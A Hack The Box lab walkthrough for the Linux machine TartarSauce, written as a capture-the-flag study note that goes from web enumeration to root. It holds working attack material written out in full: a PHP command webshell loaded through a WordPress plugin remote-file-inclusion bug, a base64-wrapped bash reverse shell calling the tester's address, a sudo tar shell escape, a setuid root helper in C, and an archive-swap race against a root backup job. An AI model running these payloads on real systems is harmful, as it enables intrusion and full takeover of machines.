---
tags: [HTB, TartarSauce, Linux, Apache, WordPress, Monstra, RFI, Tar, Systemd, PrivEsc, Medium]
platform: HackTheBox
os: Linux
hostname: tartarsauce.htb
domain: None
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: TartarSauce, Full Walkthrough

## The gist

TartarSauce is a Linux box where the reliable path is driven by careful web enumeration and then by reading the local automation rather than guessing at kernel exploits:

1. `robots.txt` reveals several application trees, including WordPress and Monstra.
2. Monstra 3.0.4 accepts the default administrative login, but the tested upload branch is blocked by the target's upload handling.
3. Aggressive WordPress plugin enumeration identifies Gwolle Guestbook and its old `abspath` remote-file-inclusion bug.
4. The RFI loads a controlled PHP file and gives command execution as `www-data`.
5. `sudo -l` permits `tar` as `onuma`; the tar checkpoint action gives a shell as that user.
6. A root-owned systemd timer runs `backuperer`, which creates an archive as `onuma` and extracts it as root after a short delay.
7. Replacing the temporary archive with a crafted archive containing a 32-bit SUID helper causes root to extract the helper with mode `4755`.

The clean chain is:

```text
WordPress/Gwolle RFI -> www-data -> sudo tar -> onuma
    -> backuperer systemd timer/archive race -> 32-bit SUID helper -> root
```

> [!warning] Lab handling
> This page records the reproducible method, commands, evidence locations, and lessons. Flag values and other sensitive values remain in the private box workspace at `/home/kali/Platforms/HackTheBox/TartarSauce/loot/` and are intentionally not copied into the vault.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| OS | Linux, Ubuntu; target architecture was `i686` |
| Difficulty | Medium |
| Hostname | tartarsauce.htb |
| IP | `$BoxIP` / `10.129.1.185` |
| Open ports | 80/tcp |
| Web stack | Apache 2.4.18, WordPress 4.9.4, Monstra 3.0.4 |
| Initial access | Gwolle Guestbook RFI, CVE-2015-8351 |
| User path | `sudo /bin/tar` as `onuma` |
| Root path | `backuperer` timer archive replacement and 32-bit SUID helper |

## Variables and evidence

```bash
boxset BoxName TartarSauce
boxset BoxIP 10.129.1.185
boxset LocalIP <VPN_ADDRESS>
boxset BoxDir /home/kali/Platforms/HackTheBox/TartarSauce
boxset WebPort 80
boxset Port 4444
boxset Port2 4445
```

The saved evidence is organised as follows:

| Evidence | Location |
|---|---|
| Full terminal history | `$BoxDir/TartarSauce.log` |
| Nmap output | `$BoxDir/nmap/` |
| Web enumeration and HTTP captures | `$BoxDir/loot/` |
| Advisory and exploit references | `$BoxDir/exploits/` |
| Private flag record | `$BoxDir/loot/flags.txt` |
| Source screenshots | `$BoxDir/screenshots/` |

> [!tip] ⚡ Efficiency
> Keep the box log, raw tool output, screenshots, and payloads together. When a branch fails, its evidence explains why it was abandoned and prevents repeating the same blind test after a reconnect or box reset.

## 1. Start with a full TCP scan

```bash
nmap -Pn -sS -p- --min-rate 3000 -oA "$BoxDir/nmap/allports" "$BoxIP"
```

The saved full scan showed only TCP/80. Follow it with a focused service scan:

```bash
nmap -Pn -sC -sV -p 80 -oA "$BoxDir/nmap/services" "$BoxIP"
```

Relevant result:

```text
80/tcp open  http  Apache httpd 2.4.18 ((Ubuntu))
```

Nmap also pulled `robots.txt`, which disclosed five web paths:

```text
/webservices/tar/tar/source/
/webservices/monstra-3.0.4/
/webservices/easy-file-uploader/
/webservices/developmental/
/webservices/phpmyadmin/
```

![[tartarsauce-nmap-allports.png]]

SCREENSHOT: Full TCP scan showing only port 80 open; redact the target address if publishing outside the lab.

![[tartarsauce-1.2nmap-services.png]]

SCREENSHOT: Targeted service scan showing Apache and the `robots.txt` disallowed paths.

> [!tip] ⚡ More efficient path
> Once `-p-` returns a single port, do not repeat default discovery across the entire range. Pass the confirmed port directly to `-sC -sV` and move immediately to HTTP enumeration.

## 2. Read `robots.txt` and enumerate the web tree

```bash
curl -sS "http://$BoxIP/robots.txt" | tee "$BoxDir/loot/robots.txt"

gobuster dir -u "http://$BoxIP/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,tar \
  -o "$BoxDir/loot/gobuster-root.txt"

gobuster dir -u "http://$BoxIP/webservices/" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,html,bak,old,tar \
  -o "$BoxDir/loot/gobuster-webservices.txt"
```

The useful web locations were:

| Path | Interpretation |
|---|---|
| `/webservices/wp/` | WordPress installation |
| `/webservices/monstra-3.0.4/` | Monstra CMS |
| `/webservices/tar/tar/source/` | Source-related path disclosed by robots, but not the final route |
| `/webservices/easy-file-uploader/` | Upload-related path; no useful foothold was obtained |

![[tartarsauce-2.robots-txt.png]]

SCREENSHOT: `robots.txt` response with the disclosed paths visible.

![[tartarsauce-3.gobuster-webservices.png]]

SCREENSHOT: Gobuster results for `/webservices/`; highlight the WordPress and Monstra directories.

> [!warning] 💡 Hint
> `robots.txt` is a lead list, not an access-control mechanism. Request every interesting path directly and record whether it is a real application, a redirect, or a 404. Do not assume every disallowed entry is exploitable.

> [!tip] 🛠️ Alternative tool
> `ffuf` or `feroxbuster` can replace Gobuster. The equivalent compact `ffuf` command is:

```bash
ffuf -u "http://$BoxIP/webservices/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.html,.bak,.tar -fc 404 -of json \
  -o "$BoxDir/loot/ffuf-webservices.json"
```

## 3. Test the Monstra branch, then park it deliberately

The Monstra directory exposed a login page and the site's default administrative credential pair worked. The password is intentionally omitted from this shared write-up. Confirm the version and save the relevant responses:

```bash
curl -sS "http://$BoxIP/webservices/monstra-3.0.4/" \
  -o "$BoxDir/loot/monstra-index.html"

curl -sS -c "$BoxDir/loot/monstra.cookies" \
  -b "$BoxDir/loot/monstra.cookies" \
  -d 'login=<ADMIN_USER>&password=<ADMIN_PASSWORD>' \
  "http://$BoxIP/webservices/monstra-3.0.4/admin/index.php" \
  -o "$BoxDir/loot/monstra-dashboard.html"
```

The saved exploit references were:

```bash
searchsploit -w "Monstra 3.0.4" | tee "$BoxDir/loot/searchsploit-monstra.txt"
```

The authenticated upload/RCE references were reviewed and a harmless `.php7` probe was tested. The target rejected the upload, so this was not treated as a working foothold. This is useful evidence: the version is interesting, but a public exploit match is not proof that the deployed configuration is exploitable.

![[tartarsauce-4-monstra-admin.png]]

SCREENSHOT: Monstra login/admin evidence showing the application and version; do not include the password in a public report.

> [!tip] ⚡ Efficiency
> After one controlled upload test proves the target-side handler blocks the expected extension, preserve the result and switch to the other confirmed application. Do not spend the entire enumeration window forcing a branch that has already contradicted its exploit assumptions.

> [!abstract] 🧠 Why this matters
> “Vulnerable version” and “usable exploit path” are different claims. The write-up should record both the positive version match and the negative deployment test.

## 4. Fingerprint WordPress and enumerate users

```bash
curl -sS -D "$BoxDir/loot/wp-headers.txt" \
  "http://$BoxIP/webservices/wp/" \
  -o "$BoxDir/loot/wp-index.html"

curl -sS "http://$BoxIP/webservices/wp/wp-login.php" \
  -o "$BoxDir/loot/wp-login.html"

curl -sS "http://$BoxIP/webservices/wp/wp-json/wp/v2/users" \
  -o "$BoxDir/loot/wp-users.json"
```

The HTML and REST API identified WordPress 4.9.4 and disclosed a valid username, `wpadmin`. This did not provide a password, but it confirmed the application and gave WPScan a focused target.

![[tartarsauce-4.wordpress-version.png]]

SCREENSHOT: WordPress version evidence from the page source or readme.

![[tartarsauce-5.wp-rest-api-users.png]]

SCREENSHOT: WordPress REST API user enumeration; redact usernames if the screenshot is shared publicly.

## 5. Run WPScan with aggressive plugin detection

The first passive/mixed scan did not reliably enumerate the plugin. Because the initial result was incomplete, rerun with aggressive plugin detection and save the output:

```bash
wpscan --url "http://$BoxIP/webservices/wp/" \
  --enumerate u, vp, vt \
  --plugins-detection aggressive \
  --api-token "$WPSCAN_API_TOKEN" \
  --output "$BoxDir/loot/wpscan-aggressive.txt"
```

If an API token is unavailable, the scan is still useful for passive detection, but aggressive detection is the important setting here. The result identified the `gwolle-gb` / Gwolle Guestbook plugin. Its public readme suggested a newer stable release, but the target's deployed plugin behaviour matched the older RFI vulnerability.

![[tartarsauce-6.wpscan-plugins.png]]

SCREENSHOT: WPScan aggressive plugin enumeration identifying Gwolle Guestbook.

> [!tip] 🛠️ Better tool
> For WordPress, use WPScan's WordPress-aware plugin detection instead of relying only on a generic directory wordlist. The command above is the repeatable version to keep in the runbook.

> [!warning] 💡 Common mistake
> A `readme.txt` stable version is not always the exact deployed version. Confirm with behaviour, source paths, changelog clues, and exploit testing. Treat version output as evidence to validate, not as a guarantee.

## 6. Confirm Gwolle RFI and obtain command execution

The vulnerable endpoint was:

```text
/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php
```

Create a minimal controlled PHP file in the local exploit directory:

```php
<?php
if (isset($_GET['cmd'])) {
    echo '<pre>';
    system($_GET['cmd']);
    echo '</pre>';
}
?>
```

Save it as `$BoxDir/exploits/wp-load.php`, then serve that directory:

```bash
cd "$BoxDir/exploits"
python3 -m http.server 8000 --bind "$LocalIP" \
  > "$BoxDir/loot/http-server.log" 2>&1 &
```

Use URL encoding for both parameters. The `abspath` value points the vulnerable include at the controlled file, and `cmd=id` proves execution without introducing a callback problem:

```bash
curl -sS -G \
  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" \
  --data-urlencode 'cmd=id' \
  -o "$BoxDir/loot/rfi-id.html"
```

The response showed execution as `www-data`.

![[tartarsauce-7.rfi-rce.png]]

SCREENSHOT: RFI request/response proving command execution as `www-data`; redact callback addresses and payload text if needed.

> [!abstract] 🧠 Why this works
> The vulnerable code constructs an include path from the attacker-controlled `abspath`. When URL-style includes are enabled, PHP fetches the local file from the attacker's HTTP server and executes the PHP it contains. This is an RFI-to-RCE chain, not merely local file read.

## 7. Turn RFI command execution into a stable shell

Start a listener:

```bash
rlwrap nc -lvnp "$Port2"
```

Base64-encode the shell text to reduce quoting problems in the nested HTTP parameter:

```bash
RevShell="bash -c 'bash -i >& /dev/tcp/$LocalIP/$Port2 0>&1'"
EncodedShell=$(printf %s "$RevShell" | base64 -w0)
Command="echo $EncodedShell | base64 -d | bash"

curl -sS -G \
  "http://$BoxIP/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php" \
  --data-urlencode "abspath=http://$LocalIP:8000/" \
  --data-urlencode "cmd=$Command" \
  -o "$BoxDir/loot/rfi-shell-response.html"
```

After the callback, verify the identity and upgrade the PTY if Python is present:

```bash
id
hostname
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 columns 140
```

If only Python 2 is present, use `python -c` instead. If neither is present, use `script -qc /bin/bash /dev/null` and restore the terminal locally with `stty raw -echo; fg; reset; export TERM=xterm`.

## 8. Enumerate sudo and use tar to become `onuma`

As `www-data`:

```bash
sudo -l
```

The relevant rule was:

```text
(onuma) NOPASSWD: /bin/tar
```

The tar checkpoint action executes a command after the first checkpoint. Run it as the allowed user:

```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash
```

Then verify:

```bash
id
```

This produced a shell as `onuma`. Read the user proof file from the private loot workflow; the flag value is intentionally omitted here.

![[tartarsauce-8.sudo-l.png]]

SCREENSHOT: `sudo -l` showing the passwordless tar rule.

![[tartarsauce-9.user-flag.png]]

SCREENSHOT: User proof capture. Keep the flag redacted in the vault and store the value only in the private box loot.

> [!tip] 🛠️ Better tool
> After `sudo -l`, check the exact binary against GTFOBins. The corresponding tar technique is the checkpoint action above; it is faster and more reliable than searching for a generic kernel exploit.

## 9. Inspect systemd timers and read `backuperer`

As `onuma`, enumerate timers rather than checking only classic cron locations:

```bash
systemctl list-timers --all
```

This revealed `backuperer.timer`, which invokes a service approximately every five minutes. Inspect the service and script:

```bash
systemctl cat backuperer.timer 2>/dev/null
systemctl cat backuperer.service 2>/dev/null
sed -n '1,240p' /usr/sbin/backuperer
```

The script's important behaviour was:

1. It archives `/var/www/html` into a random hidden file under `/var/tmp`.
2. The archive is created as `onuma`.
3. It waits about 30 seconds.
4. It extracts the archive as root into `/var/tmp/check`.
5. It compares the extracted tree and moves a matching archive into `/var/backups`.

![[tartarsauce-10.timers.png]]

SCREENSHOT: `systemctl list-timers --all` showing the recurring backup timer.

![[tartarsauce-11.backuperer-script.png]]

SCREENSHOT: `/usr/sbin/backuperer` showing the user-created archive, delay, root extraction, and comparison logic.

> [!warning] 💡 Hint
> The critical question is not only “who owns the script?” It is “which files cross a privilege boundary between the unprivileged archive step and the root extraction step?” A temporary archive written by a user and later trusted by root is the boundary to investigate.

## 10. Check the target architecture before building the payload

The target reported an i686 userspace. Confirm this before copying a system binary into a root-extracted archive:

```bash
uname -m
file /bin/bash
```

An x86_64 `/bin/bash` copied into an i686 target can be extracted successfully and still fail with `Exec format error`. The working artifact was a small 32-bit SUID helper compiled on Kali and stored privately as `$BoxDir/exploits/suid`.

Example helper source:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

Preferred build options, depending on the installed cross-compiler:

```bash
gcc -m32 -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
file "$BoxDir/exploits/suid"
```

or:

```bash
i686-linux-gnu-gcc -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
file "$BoxDir/exploits/suid"
```

The `file` result should identify an ELF 32-bit i386 executable. If the compiler is unavailable, install the appropriate multilib/cross-compiler package on the attack VM or use a prebuilt helper that matches the target architecture. Do not silently substitute a 64-bit payload.

> [!tip] ⚡ Efficiency
> Run `uname -m` and `file /bin/bash` immediately after the first user shell. It prevents spending the race window on a payload that the target cannot execute.

## 11. Build a root-owned SUID archive

The archive must contain the helper at a path that will be extracted beneath the backup check directory. Its tar metadata must request root ownership and SUID mode:

```bash
mkdir -p /dev/shm/evil/var/www/html
cp "$BoxDir/exploits/suid" /dev/shm/evil/var/www/html/roothelper

tar --owner=0 --group=0 --mode=4755 \
  -czf /dev/shm/evil.tar.gz \
  -C /dev/shm/evil var/www/html/roothelper

tar -tvzf /dev/shm/evil.tar.gz
```

The archive listing should show the helper with SUID mode and root ownership in its metadata.

![[tartarsauce-12.evil-archive.png]]

SCREENSHOT: Local malicious archive listing showing root ownership and mode `4755`; do not include unrelated host paths.

## 12. Win the archive replacement race

The service creates a random hidden filename in `/var/tmp`, keeps it open through the archive/settling phase, and later extracts it as root. The replacement loop waits for a candidate archive, waits until its size is stable, then copies the crafted archive over it:

```bash
while true; do
    Candidate=$(find /var/tmp -maxdepth 1 -type f -name '.[0-9a-f]*' -printf '%p\n' 2>/dev/null | head -n1)
    if [ -n "$Candidate" ]; then
        FirstSize=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
        sleep 1
        SecondSize=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
        if [ "$FirstSize" -gt 0 ] && [ "$FirstSize" = "$SecondSize" ]; then
            cp /dev/shm/evil.tar.gz "$Candidate"
            break
        fi
    fi
    sleep 1
done
```

If the timer interval or service state is uncertain, keep the loop running across one complete interval and watch the result:

```bash
watch -n 1 'find /var/tmp -maxdepth 3 -name roothelper -ls 2>/dev/null'
```

When the root extraction succeeds, the helper appears below `/var/tmp/check/var/www/html/` with root ownership and SUID mode.

![[tartarsauce-13.archive-replaced.png]]

SCREENSHOT: Extracted helper showing root ownership and the SUID bit after the archive swap.

> [!warning] 💡 Common mistakes
>
> - Replacing the archive while tar is still writing it can produce a corrupt archive.
> - Reusing an old hidden filename can cause the script's cleanup step to remove it.
> - A 64-bit helper on this i686 target produces `Exec format error`.
> - A successful extraction is not enough; verify ownership, mode, architecture, and execution identity separately.

## 13. Execute the extracted helper and prove root

```bash
chmod 4755 /var/tmp/check/var/www/html/roothelper 2>/dev/null || true
/var/tmp/check/var/www/html/roothelper

id
whoami
```

The final proof showed an effective UID of 0. Read `/root/root.txt` from the root shell and store the value in the private loot record rather than this shared write-up.

![[tartarsauce-14.root-shell.png]]

SCREENSHOT: Root proof showing `euid=0(root)` and the final shell; redact the flag value.

## 14. Cleanup and close-out

Remove only artifacts created for the test, then close listeners and record completion:

```bash
rm -f /var/tmp/check/var/www/html/roothelper
rm -f /dev/shm/evil.tar.gz
pkill -f 'python3 -m http.server 8000' || true
pkill -f "nc -lvnp $Port2" || true
boxdone
```

If a box reset is available, use it after recording evidence. A reset is the safest way to remove timer-created files and any root-extracted artifacts that are difficult to enumerate reliably from an unprivileged shell.

## Credentials and sensitive artifacts

| Item | Status | Storage |
|---|---|---|
| Monstra default admin login | Verified during testing; not a final foothold | Private log/loot only |
| WordPress REST username | Disclosed by the application | Private log/loot; redact in public screenshots |
| User flag | Captured | `$BoxDir/loot/flags.txt` only |
| Root flag | Captured | `$BoxDir/loot/flags.txt` only |
| RFI payload and 32-bit helper | Reproducible artifacts | `$BoxDir/exploits/` |

## Troubleshooting and alternate routes

| Symptom | Likely cause | Corrective action |
|---|---|---|
| WPScan misses Gwolle | Passive plugin detection is incomplete | Rerun with `--plugins-detection aggressive` |
| Monstra upload returns an error | Target handler/configuration blocks the tested extension | Preserve the negative result and pivot to WordPress |
| RFI returns only page HTML | Include or command parameter was not URL-encoded, or callback file is not served | Test `cmd=id` first and verify the local HTTP server log |
| Reverse shell never arrives | Wrong VPN interface or nested shell quoting | Prove RFI with `id`, then base64-encode the shell command |
| `sudo tar` does not spawn a shell | The exact allowed path/options differ | Recheck `sudo -l` and use `/bin/tar` exactly as permitted |
| Extracted helper says `Exec format error` | Wrong architecture | Confirm `uname -m`; build/download an i386 helper |
| Race produces no helper | Archive copied while still being written or the timer has not run | Wait for a stable candidate and cover a full timer interval |
| Helper extracts without SUID | Tar metadata or filesystem handling stripped the mode | Inspect `tar -tvzf` locally and `ls -l` after extraction |

## OSCP pass notes

This box covers several exam-relevant habits:

- Full-port scanning before committing to the obvious web service.
- Treating `robots.txt`, directory discovery, source files, and application APIs as complementary evidence.
- WordPress-aware enumeration with aggressive plugin detection.
- Verifying an RFI with a harmless command before sending a shell.
- Checking `sudo -l` immediately after a foothold and mapping the exact binary to GTFOBins.
- Enumerating systemd timers in addition to cron.
- Reading backup scripts for ownership transitions, temporary files, delays, and archive trust.
- Checking CPU architecture before staging a binary payload.
- Capturing screenshots at each proof boundary while keeping flags and credentials out of shared notes.

## Reusable checklist

```text
[ ] Full TCP scan and focused service scan
[ ] Read robots.txt and enumerate each disclosed application
[ ] Identify WordPress and query the REST API
[ ] Run WPScan with aggressive plugin detection
[ ] Test the Gwolle ajaxresponse.php abspath RFI with id
[ ] Obtain and stabilise a www-data shell
[ ] Run sudo -l and test the exact tar rule
[ ] Read user proof and save it privately
[ ] Enumerate systemd timers and inspect their service/script
[ ] Find user-written archive -> root extraction boundary
[ ] Check target architecture before building a helper
[ ] Build archive with root ownership and SUID metadata
[ ] Replace only after the temporary archive is stable
[ ] Verify root ownership, SUID, architecture, and euid=0
[ ] Read root proof privately
[ ] Remove payloads, close listeners, run boxdone
```

## RUNBOOK V2 stages demonstrated

- [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] -- Apache-only scan and `robots.txt` lead discovery.
- [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] -- Gobuster, WordPress, REST API, and CMS branch triage.
- [[OSCP/RUNBOOK V2/Linux - RFI|Linux - RFI]] -- controlled PHP include and `cmd=id` confirmation.
- [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] -- RFI-to-shell workflow.
- [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] -- `sudo tar` checkpoint execution.
- [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] -- architecture and local service/timer review.
- [[OSCP/RUNBOOK V2/Linux - Cron Check|Linux - Cron Check]] -- scheduler review extended to systemd timers and backup scripts.
- [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] -- payload removal and `boxdone` close-out.

## Related write-ups

- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- source-led web upload, cron data flow, and configuration parsing.
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- PHP file inclusion, credential handling, and tunnelling.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- authenticated CMS upload and SUID-based Linux privilege escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- architecture-aware custom SUID source review.

## External resources

- [GTFOBins tar](https://gtfobins.github.io/gtfobins/tar/)
- [HackTricks WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [CVE-2015-8351 / Gwolle Guestbook](https://nvd.nist.gov/vuln/detail/CVE-2015-8351)
- [HackTricks file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

## Attack chain

```text
TCP 80
  -> robots.txt and Gobuster expose WordPress/Monstra
  -> WPScan aggressive plugin detection finds Gwolle Guestbook
  -> CVE-2015-8351 abspath RFI loads controlled PHP
  -> command execution as www-data
  -> sudo /bin/tar as onuma
  -> tar checkpoint action produces onuma shell
  -> systemd backuperer timer creates user archive, then root extracts it
  -> stable archive replacement wins the race
  -> root-owned 32-bit SUID helper is extracted
  -> euid 0 and root proof
```

## Flags

- `user.txt`: confirmed and stored privately in `$BoxDir/loot/flags.txt`; value intentionally omitted.
- `root.txt`: confirmed and stored privately in `$BoxDir/loot/flags.txt`; value intentionally omitted.

## Lessons learned

The decisive skill on TartarSauce was prioritisation. The first application branch had a plausible public exploit, but the target rejected the upload. WordPress enumeration then exposed a more direct route. After foothold, the box rewarded reading the exact privilege boundary: `tar` was a direct user transition, while the backup timer was an archive ownership race. Finally, the architecture check prevented a misleading “successful” root extraction from becoming an execution failure.
